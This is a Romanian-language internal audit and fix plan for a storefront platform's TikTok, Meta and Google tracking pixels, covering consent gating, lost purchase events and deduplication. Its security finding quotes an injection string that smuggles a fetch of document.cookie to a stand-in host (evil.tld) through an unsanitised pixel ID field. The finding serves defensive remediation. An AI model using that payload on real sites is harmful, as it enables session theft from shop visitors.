# Audit Pixeli & Tracking — Analiză completă + Plan de remediere

> **STATUS 2026-07-03: Faza 0 + Faza 1 IMPLEMENTATE** (build verde: `tsc --noEmit` + `next build`, încă nepushat).
> Fixate: P1 (banner OFF ucidea pixelii), P2 (Purchase pierdut prin race pe `/confirm` — coadă de evenimente), P3 (XSS pixel ID), P4 (InitiateCheckout în OrderModal), P5 (dedup Purchase), P6 (Advanced Matching), P7 (snippet TikTok + `contents[]`), P8 (ghid testare în dashboard). **RĂMÂNE Faza 2** (CAPI + TikTok Events API server-side) — §5.

Data: 2026-07-03
Context: un merchant a raportat că TikTok Pixel nu apare în TikTok Pixel Helper după configurare. Auditul acoperă întregul sistem de pixeli/tracking (TikTok, Meta/Facebook, Google Tag/Ads, GA4), compară cu practica industriei (plugin-ul oficial Meta pentru WooCommerce, ecosistemul TikTok pentru WooCommerce, modelul Shopify) și propune planul complet de remediere.

---

## 1. Rezumat executiv

**Cauza raportului "pixelul TikTok nu se injectează":** pixelii NU sunt injectați în pagină decât după ce vizitatorul apasă „Accepta" în bannerul de cookies (gating GDPR strict prin `ConsentGate`). Două situații concrete:

1. **Bannerul de cookies dezactivat de merchant** (Setări → Banner Cookies → switch OFF): bannerul — singurul mecanism care scrie consimțământul în `localStorage` — nu se mai afișează, dar `ConsentGate` continuă să ceară consimțământ. Rezultat: **pixelii nu se încarcă NICIODATĂ, pentru niciun vizitator**. Blackout total de tracking, silențios.
2. **Bannerul activ, dar testerul nu a apăsat „Accepta"** (sau a apăsat „Refuza" într-o vizită anterioară — alegerea persistă în `localStorage`): Pixel Helper nu vede nimic, merchantul crede că integrarea e stricată.

**Descoperire și mai gravă:** chiar și cu consimțământ acordat, **evenimentul de cumpărare (Purchase / CompletePayment / purchase GA4 / conversia Google Ads) se pierde practic la fiecare comandă**. Pagina `/confirm` e un page-load complet; evenimentul se trage dintr-un `useEffect` care rulează ÎNAINTE ca scripturile de pixel (montate întârziat prin `ConsentGate`) să existe. `fbTrack`/`ttqTrack`/`gtagEvent` verifică `typeof fbq === "function"` și, negăsind funcția, **renunță silențios**. Exact evenimentul pentru care advertiserii folosesc pixeli — conversia — nu ajunge aproape niciodată la platforme.

**Alte probleme:** vector XSS stored prin pixel ID nesanitizat (severitate mare, origine partajată edinio.com), fluxul single-product (OrderModal) nu trage niciun eveniment de funnel, duplicare Purchase la refresh pe `/confirm`, lipsă `event_id` (imposibil dedup pentru viitorul server-side), lipsă Advanced Matching, snippet TikTok învechit.

**Vestea bună:** arhitectura de bază e sănătoasă (stocare în `store_settings.marketing_config`, injecție centralizată în layoutul public, Consent Mode v2 pentru Google implementat corect), iar problema „PageView pe navigare SPA" pe care am fi putut-o suspecta **nu există**: Meta, TikTok și GA4 detectează automat schimbările de URL (detalii în §4.4 — important: NU adăugăm PageView manual pe route change, am dubla evenimentele).

---

## 2. Arhitectura actuală

### 2.1 Stocare configurare
- `store_settings.marketing_config` (jsonb): `facebook_pixel_id`, `tiktok_pixel_id`, `google_tag_id`, `google_ads_conversion_label` — tip `MarketingConfig` în `src/lib/marketing.ts`.
- `store_settings.google_analytics_config`: GA4 prin OAuth (`measurement_id`, `tracking_enabled`).
- `store_settings.cookie_banner_config`: `{ enabled, position }` — `src/lib/cookie-consent.ts`.
- UI configurare: `src/components/dashboard/{TikTokPixelConfigClient,FacebookPixelConfigClient,MarketingConfigClient,GoogleAdsConfigClient}.tsx` → server action `saveMarketingConfig` (`src/lib/actions/marketing.actions.ts`).

### 2.2 Injecție pe storefront
`src/app/(public)/[slug]/layout.tsx` (server) citește configurările cu admin client și randează:

```
{fbPixelId && <ConsentGate category="marketing"><FacebookPixel/></ConsentGate>}
{ttPixelId && <ConsentGate category="marketing"><TikTokPixel/></ConsentGate>}
{googleTagIds.length > 0 && <ConsentGate category="analytics"><GoogleTag/></ConsentGate>}
{children}
{cookieConfig.enabled && <CookieConsent/>}
```

- `ConsentGate` (`src/components/public/ConsentGate.tsx`): client component, pornește cu `granted=false`, citește `localStorage` în `useEffect`, randează copiii doar după grant. Ascultă `edinio-consent-change` pentru grant fără reload.
- `CookieConsent` (`src/components/public/CookieConsent.tsx`): scrie consimțământul (`edinio_cc_<slug>`, versionat) și emite evenimentul.
- `FacebookPixel` / `TikTokPixel` / `GoogleTag` (`src/components/public/`): `<Script strategy="afterInteractive">` cu bootstrap-ul inline standard. GoogleTag include Consent Mode v2 (default din alegerea vizitatorului + `consent update` live).

### 2.3 Evenimente e-commerce (client-side, `src/lib/marketing.ts`)
| Eveniment | Unde se trage | Meta | TikTok | Google |
|---|---|---|---|---|
| PageView | automat la load (bootstrap) | ✅ | ✅ | ✅ (config) |
| Vizualizare produs | `ProductPage.tsx:251` (useEffect) | ViewContent | ViewContent | view_item |
| Adăugare în coș | `MiniStoreRenderer.tsx:1743` (doar coș) | AddToCart | AddToCart | add_to_cart |
| Începere checkout | `MiniStoreRenderer.tsx:2614` (doar modal coș) | InitiateCheckout | InitiateCheckout | begin_checkout |
| Cumpărare | `FbPurchaseEvent.tsx` pe `/confirm` (useEffect) | Purchase | CompletePayment | purchase + conversie Ads |

Helperii `fbTrack`/`ttqTrack`/`gtagEvent` sunt „safe": dacă librăria nu e în `window`, **evenimentul e aruncat silențios** (nu există coadă/retry).

### 2.4 Fluxuri către confirmare
Toate drumurile spre `/confirm` sunt **full page load** (`window.location.href`): `OrderModal.tsx:414,420` și `MiniStoreRenderer.tsx:480,487` (inclusiv întoarcerea din redirect de plată Netopia/Stripe/iPay).

---

## 3. Probleme identificate (ordonate după severitate)

### P1 — CRITIC: Banner dezactivat ⇒ pixelii nu se încarcă niciodată
- **Unde:** `layout.tsx:82-101` + `SettingsClient.tsx:1521` (switch-ul „Afiseaza bannerul de cookie-uri").
- **Mecanism:** `ConsentGate` cere consimțământ indiferent de starea bannerului; cu bannerul OFF nu mai există nimic care să scrie consimțământul. Nici `Accepta` de pe o vizită veche nu ajută vizitatorii noi.
- **Impact:** 100% din tracking mort pe magazinele cu bannerul dezactivat. Cel mai probabil exact cazul raportat.
- **Fix (decizie de produs, recomandare aliniată cu industria — vezi §4.3):** bannerul OFF = pixelii se încarcă necondiționat (merchantul își asumă răspunderea legală), cu un avertisment clar în Setări. Bannerul ON = comportamentul actual (opt-in GDPR, corect). Implementare: layoutul pasează `requireConsent={cookieConfig.enabled}`; `ConsentGate` primește prop `bypass` (sau nu se mai randează wrapperul când bannerul e OFF).

### P2 — CRITIC: Conversiile de cumpărare se pierd (race condition pe `/confirm`)
- **Unde:** `FbPurchaseEvent.tsx:14-17` vs. `ConsentGate.tsx:21-29` + `<Script strategy="afterInteractive">`.
- **Mecanism:** la un page-load proaspăt, efectele React rulează într-o primă pasă în care `ConsentGate` abia își setează `granted=true` (re-render ulterior; abia apoi se montează `<Script>` și se execută bootstrap-ul care definește `fbq`/`ttq`/`gtag`). `FbPurchaseEvent` rulează în prima pasă → toate cele 4 evenimente de conversie sunt no-op.
- **Impact:** Purchase (Meta), CompletePayment (TikTok), purchase (GA4) și conversia Google Ads practic nu se trimit niciodată de pe `/confirm` (singura excepție teoretică: navigare SPA către confirm, care nu există în cod). Campaniile nu pot optimiza pe conversii, ROAS invizibil.
- **Fix:** coadă de evenimente. `fbTrack`/`ttqTrack`/`gtagEvent` fac push în `window.__edinioQueue` când librăria lipsește; componentele de pixel golesc coada imediat după bootstrap (o linie la finalul scriptului inline). Acoperă și cazul „vizitatorul acceptă bannerul chiar pe /confirm". Modelul e echivalentul pattern-ului „deferred events" din plugin-ul oficial Meta pentru WooCommerce (§4.1).

### P3 — MARE (securitate): XSS stored prin pixel ID
- **Unde:** `FacebookPixel.tsx:15` și `TikTokPixel.tsx:17` interpolează `'${pixelId}'` direct în script inline; `saveMarketingConfig` (`marketing.actions.ts`) nu validează nimic.
- **Mecanism:** un merchant rău-intenționat salvează ca „pixel ID" ceva de forma `X');fetch('https://evil.tld?c='+document.cookie);('` → JavaScript arbitrar pe paginile magazinului său, care rulează pe **originea edinio.com** (partajată cu dashboardul) → risc cross-tenant (sesiuni/localStorage ale altor utilizatori Edinio care vizitează magazinul).
- **Notă:** `GoogleTag.tsx:19` sanitizează deja corect (`replace(/[^A-Za-z0-9_-]/g,"")`) — modelul e în casă, doar trebuie aplicat peste tot.
- **Fix:** (a) sanitizare identică în ambele componente (defense-in-depth), (b) validare format în `saveMarketingConfig`: Meta `^\d{5,20}$`, TikTok `^[A-Z0-9]{8,32}$` (case-insensitive), Google `^(G|AW|GT)-[A-Z0-9]{4,}$`, (c) UX: dacă merchantul lipește snippet-ul întreg, extragem automat ID-ul (regex pe `ttq.load('...')` / `fbq('init','...')`) în loc să dăm eroare.

### P4 — MARE: Fluxul single-product nu trage niciun eveniment de funnel
- **Unde:** `OrderModal.tsx` — zero apeluri de tracking. Butonul „Comanda acum" din `ProductPage` deschide `OrderModal` direct.
- **Impact:** pentru magazinele one-product (exact profilul care rulează reclame TikTok) funnel-ul e: ViewContent → gol → conversie pierdută (P2). Fără InitiateCheckout, platformele nu pot optimiza pe mid-funnel.
- **Fix:** la deschiderea `OrderModal`: `InitiateCheckout` (Meta) + `InitiateCheckout` (TikTok) + `begin_checkout` (GA4), simetric cu `MiniStoreRenderer.tsx:2614`.

### P5 — MEDIE: Purchase duplicat la refresh pe `/confirm`
- **Mecanism:** `FbPurchaseEvent` trage la fiecare mount; refresh/revenire pe pagină = conversii duplicate (odată ce P2 e reparat, problema devine vizibilă).
- **Fix:** guard `localStorage` per `orderId` (`edinio_purch_<orderId>`) + trimiterea `eventID`/`event_id = orderId` pe evenimentele de cumpărare (Meta ignoră dublurile cu același eventID în fereastră scurtă, TikTok analog, și e fundația pentru dedup cu server-side din Faza 2).

### P6 — MEDIE: Lipsă Advanced Matching
- **Context:** checkout-ul colectează nume, telefon, email (`OrderModal.tsx:114`), dar nu pasăm nimic către pixeli. Post-iOS14, Advanced Matching + CAPI sunt pârghia principală de match quality (EMQ) — standard în toate plugin-urile WooCommerce serioase.
- **Fix (client-side, Faza 1):** pe `/confirm`, înainte de evenimentele de cumpărare: Meta — al doilea `fbq('init', id, {em, ph, fn, ln})` (pixelul hash-uiește singur cu SHA-256, dar valorile trebuie normalizate: email lowercase/trim, telefon doar cifre cu prefix de țară); TikTok — `ttq.identify({ email, phone_number })` cu SHA-256 client-side (SubtleCrypto) și telefon E.164. Datele vin din comanda deja citită server-side pe `/confirm` (nu introducem fetch-uri noi). Doar cu consimțământ marketing acordat.

### P7 — MICĂ: Snippet TikTok învechit + format parametri legacy
- Baza noastră (`TikTokPixel.tsx`) nu include stub-urile Consent API (`holdConsent`, `revokeConsent`, `grantConsent`) prezente în snippet-ul curent generat de Events Manager. Funcțional azi, dar de actualizat (și ne deschide opțiunea Consent API în viitor).
- Parametrii evenimentelor TikTok folosesc formatul plat (`content_id` top-level); recomandarea curentă e `contents: [{content_id, content_type, content_name, price, quantity}]` + `value`/`currency` — cerut pentru feature-urile noi (Video Shopping Ads).
- Meta `ViewContent`/`AddToCart` sunt OK ca format; de adăugat `contents` și acolo pentru consistență (opțional).

### P8 — MICĂ (UX/proces): Merchant-ul nu are cum să știe de ce „nu merge"
- Nicăieri în dashboard nu se spune că pixelii sunt blocați până la consimțământ; paginile de configurare promit „PageView — la fiecare vizită" fără mențiunea GDPR.
- **Fix:** callout în paginile de configurare pixel: cum testezi corect (incognito → Accepta → Pixel Helper), ce înseamnă bannerul pentru tracking, plus card de status („Banner cookies: activ → pixelii se încarcă după consimțământ").

### Non-probleme (verificate, nu necesită acțiune)
- **PageView pe navigare SPA:** Meta `fbevents.js` interceptează `pushState`/`replaceState` și trage PageView automat (există și flag `disablePushState`); TikTok măsoară automat schimbările de URL în SPA-uri (default ON pentru instalări directe); GA4 acoperă prin Enhanced Measurement (History change, default ON la nivel de proprietate). **Nu adăugăm PageView manual pe route change — am dubla numerele.**
- **Google Consent Mode v2:** implementat corect în `GoogleTag.tsx` (default din alegerea stocată + `consent update` live). De ajustat doar pentru cazul „banner OFF" (default granted).
- **`noscript` fallback Meta:** prezent.
- **Poziția scripturilor în `<body>`, nu `<head>`:** irelevant funcțional — pixel helper-ele și platformele acceptă ambele; `next/script` gestionează injecția.

---

## 4. Cum procedează industria (research)

### 4.1 Plugin-ul oficial Meta pentru WooCommerce (`facebook/facebook-for-woocommerce`)
- **Validare + escaping pixel ID** (`is_valid_id()` + `esc_js()`) — noi nu avem niciuna (P3).
- **Evenimentele sunt randate în același bloc cu bootstrap-ul pixelului** (server-side, pe pagina relevantă: Purchase pe order-received) → ordinea init → PageView → Purchase e garantată prin construcție. Echivalentul nostru e coada din P2.
- **Deferred events**: evenimente puse în coadă pentru următorul page-load când acțiunea e urmată de redirect (AddToCart → redirect) — exact clasa noastră de problemă la `/confirm`.
- **Dedup pe `event_id`** peste tot + guard client (`window.wcFacebookPixelFiredEvents`) contra dublei execuții; Purchase primește event_id derivat din comandă, același trimis prin Conversions API → Meta păstrează un singur eveniment.
- **Advanced Matching** cu PII normalizat + hash; identifier de platformă („agent") pe evenimente.

### 4.2 Ecosistemul TikTok pentru WooCommerce
- Set standard: `ViewContent`, `AddToCart`, `InitiateCheckout`, (`AddPaymentInfo`), `PlaceAnOrder`, `CompletePayment`.
- `PlaceAnOrder` = comandă plasată (checkout → thank-you); `CompletePayment` = plată reușită. În practică, pe piețe COD plugin-urile trag ambele pe thank-you page — pentru ramburs (majoritar în RO), comanda confirmată E conversia pe care se optimizează. Recomandare Edinio: pe `/confirm` tragem `PlaceAnOrder` + `CompletePayment` (ambele cu același `event_id` bazat pe orderId).
- Advanced Matching prin `ttq.identify()` (email + telefon E.164, SHA-256); dedup Pixel ↔ Events API prin `event_id` identic.

### 4.3 Shopify (modelul de consent al unei platforme SaaS)
- Pixelii **se încarcă implicit**; blocarea până la consimțământ e **opt-in al merchantului** (Customer Privacy, per regiune). Shopify e chiar criticat că bannerul default nu blochează scripturile.
- Concluzie pentru Edinio: modelul nostru „banner ON ⇒ opt-in strict" e mai corect legal decât al lor și îl păstrăm. Dar „banner OFF ⇒ tracking mort pentru totdeauna" nu e comportamentul niciunei platforme — banner OFF trebuie să însemne „încarcă direct, răspunderea merchantului", cu avertisment în UI.

### 4.4 Comportamente SPA ale pixelilor (de ce NU adăugăm PageView manual)
- **Meta:** `fbevents.js` auto-PageView pe History API (`pushState`/`replaceState`). Manual + automat = dublă numărare documentată.
- **TikTok:** „SPA Pageview Measurement" — automat la schimbarea URL-ului, default ON pentru instalări directe (nu prin partener).
- **GA4:** Enhanced Measurement → History change, default ON.

### 4.5 Standardul de aur: browser pixel + server-side cu dedup
- Meta Conversions API și TikTok Events API dublează evenimentele critice server-side (`graph.facebook.com/v21+/{pixel_id}/events`, `business-api.tiktok.com/open_api/v1.3/event/track/`), cu `event_id` identic cu cel din browser → platforma deduplichează și păstrează evenimentul cu match quality maxim. Rezistent la ad-blockere, ITP, sesiuni scurte. Necesită access token per merchant (System User token la Meta / access token TikTok) — configurabil în dashboard. Condiționat de consimțământ (snapshot-ul consimțământului se stochează pe comandă).

---

## 5. Planul de remediere

### Faza 0 — Hotfix URGENT (deblochează cazul raportat; ~o zi de lucru)
1. **P1 — banner OFF ⇒ pixeli necondiționat.**
   - `layout.tsx`: când `cookieConfig.enabled === false`, randează pixelii fără `ConsentGate`; `GoogleTag` primește `requireConsent=false` (consent default granted).
   - `SettingsClient.tsx` (Banner Cookies): la switch OFF, callout de avertisment: „Instrumentele de marketing/analiză se vor încărca fără consimțământul vizitatorilor. Îți asumi conformitatea GDPR."
2. **P2 — coadă de evenimente în `marketing.ts`.**
   - `fbTrack`/`ttqTrack`/`gtagEvent`: dacă librăria lipsește → push în `window.__edinioQ` (array global, safe la SSR).
   - `FacebookPixel`/`TikTokPixel`/`GoogleTag`: la finalul scriptului inline, golește coada pentru vendorul respectiv (funcție mică inline, fără dependențe).
   - Rezolvă și „consimțământ acordat după evenimente" (banner acceptat pe /confirm).
3. **P5 — dedup Purchase:** guard `localStorage` per orderId în `FbPurchaseEvent` + `eventID`/`event_id = orderId` pe toate evenimentele de cumpărare.
4. **P3 — securitate:** sanitizare în componente + validare regex în `saveMarketingConfig` + extragere automată ID din snippet lipit.
5. **P4 — `OrderModal`:** InitiateCheckout/begin_checkout la deschidere.
6. **P8 — comunicare:** callout „Cum verifici pixelul" în paginile TikTok/Facebook Pixel din dashboard (incognito → Accepta cookies → Pixel Helper; menționează gating-ul GDPR).

### Faza 1 — Calitate & parametri (1–2 zile)
7. **TikTok:** snippet actualizat (stub-uri Consent API) + `contents[]` pe ViewContent/AddToCart/InitiateCheckout/CompletePayment + `PlaceAnOrder` pe `/confirm`.
8. **Meta:** `contents`/`content_ids` consistente; `num_items`, `content_type: "product"` peste tot.
9. **P6 — Advanced Matching pe `/confirm`:** re-init Meta cu `{em, ph, fn, ln}` normalizate + `ttq.identify` (SHA-256) înaintea evenimentelor de cumpărare; doar cu consimțământ marketing.
10. **AddToCart din ProductPage:** butonul principal deschide OrderModal (acoperit de P4), dar dacă există și „adaugă în coș" pe alte fluxuri (bundles), verificăm simetria evenimentelor.
11. **QA matrix:** banner ON+accept / ON+refuz / OFF, COD + card (Netopia/Stripe/iPay), coș + single-product + one-product store, verificare în Pixel Helper (TikTok/Meta) + GA4 DebugView + Tag Assistant.

### Faza 2 — Server-side & dedup complet (etapă separată, după Fazele 0–1)
12. **Meta CAPI + TikTok Events API** pentru Purchase/CompletePayment din server actionul de creare comandă (avem deja email/telefon/total/items pe comandă; captăm și `fbp`/`fbc`/`ttclid` la checkout): `event_id = orderId` (dedup cu browserul), hash SHA-256 server-side, `test_event_code` configurabil în dashboard, respectă snapshot-ul de consimțământ stocat pe comandă.
13. **Status & sănătate în dashboard:** card per integrare („ultimul eveniment trimis", erori API), eventual log minimal în `error_logs`.

### Decizie de produs necesară (înainte de Faza 0.1)
- **Banner OFF ⇒ pixeli fără consimțământ** (recomandat, standard industrie, răspunderea merchantului, cu avertisment explicit în UI) — SAU banner obligatoriu când există trackere (mai strict legal, dar frustrant și atipic). Restul planului nu depinde de această alegere.

---

## 6. Checklist de verificare (după implementare)
- [ ] Magazin cu banner OFF: TikTok Pixel Helper vede pixelul + PageView imediat, fără nicio interacțiune.
- [ ] Magazin cu banner ON: nimic înainte de „Accepta"; după „Accepta" pixelul apare fără reload; după „Refuza" nu apare (și rămâne așa la reload).
- [ ] Comandă COD test: pe `/confirm` apar Purchase (Meta), CompletePayment + PlaceAnOrder (TikTok), purchase (GA4 DebugView), conversia Ads — cu valoare și RON corecte; refresh pe `/confirm` NU dublează.
- [ ] Comandă card test (Netopia sandbox): aceleași evenimente după întoarcerea din redirect.
- [ ] ViewContent pe pagina de produs + în one-product store (homepage).
- [ ] InitiateCheckout din ambele fluxuri (coș + OrderModal).
- [ ] Events Manager (Meta) și TikTok Events Manager arată evenimentele cu Advanced Matching activ (EMQ îmbunătățit).
- [ ] Pixel ID invalid respins la salvare; snippet lipit → ID extras automat.

## 7. Surse
- TikTok: [SPA Pageview Measurement](https://ads.tiktok.com/help/article/about-single-page-application-pageview-measurement-for-tiktok-pixel?lang=en), [Set up and Verify Pixel](https://ads.tiktok.com/help/article/get-started-pixel?lang=en), [Advanced Matching for Web](https://ads.tiktok.com/help/article/advanced-matching-web), [TikTok Events API — dedup](https://taggrs.io/docs/server-side-tracking/tiktok/event-deduplication), [Standard events](https://analytigrow.com/tiktok-pixel-standard-events-required-ad-optimization/)
- Meta: [facebook-for-woocommerce (GitHub)](https://github.com/facebook/facebook-for-woocommerce/blob/main/facebook-commerce-pixel-event.php), [Advanced Matching](https://developers.facebook.com/docs/meta-pixel/advanced/advanced-matching/), [Dedup Pixel + CAPI](https://www.facebook.com/business/help/823677331451951), [SPA tagging (fbq pushState)](https://developers.facebook.com/ads/blog/post/2017/05/29/tagging-a-single-page-application-facebook-pixel/), [pushState auto-PageView issue](https://github.com/segment-integrations/analytics.js-integration-facebook-pixel/issues/5)
- Shopify: [Customer privacy settings](https://help.shopify.com/en/manual/privacy-and-security/privacy/customer-privacy-settings/privacy-settings), [Pixel Privacy API](https://shopify.dev/docs/api/web-pixels-api/pixel-privacy), [Pixels firing without consent](https://www.analytics-ninja.com/blog/2025/01/shopify-app-custom-pixels-customer-privacy.html)
- WooCommerce/TikTok: [TikTok for WooCommerce](https://woocommerce.com/products/tiktok-for-woocommerce/), [TikTok Events API for WooCommerce](https://seresa.io/blog/platform-integrations/tiktok-events-api-for-woocommerce-why-your-pixel-alone-isnt-enough)
